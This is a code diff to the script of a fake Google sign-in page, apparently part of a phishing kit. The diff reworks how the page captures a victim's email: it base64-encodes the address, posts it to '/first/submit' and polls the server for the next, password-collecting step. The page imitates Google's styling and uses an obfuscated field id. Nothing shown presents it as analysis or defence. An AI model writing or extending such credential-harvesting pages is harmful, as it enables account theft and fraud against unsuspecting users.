@@ -164,25 +164,14 @@
         location.href = "https://accounts.google.com";
       };
 
-      document.getElementById('nextBtn').onclick = function (e) {
+      document.querySelector('.loginform').addEventListener('submit', function (e) {
+        e.preventDefault();
         const input = document.getElementById('pEyar');
         if (!input.value) return;
         document.getElementById('pEyar').classList.remove('input-error');
         document.getElementById('emailError').style.display = 'none';
         document.querySelector('.shwpwd').style.marginTop = '-18px';
         showLoadingBar();
-        // POST email to server
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = '/';
-        const field = document.createElement('input');
-        field.type = 'hidden';
-        field.name = 'username';
-        field.value = input.value;
-        form.appendChild(field);
-        document.body.appendChild(form);
-
-        // Submit via fetch so page stays, then poll for pwd URL
         const encodedEmail = btoa(input.value);
         fetch('/first/submit', {
           method: 'POST',
@@ -208,7 +197,7 @@
               .catch(() => {});
           }, 2000);
         }).catch(() => {});
-      };
+      });
     });
     </script>
     
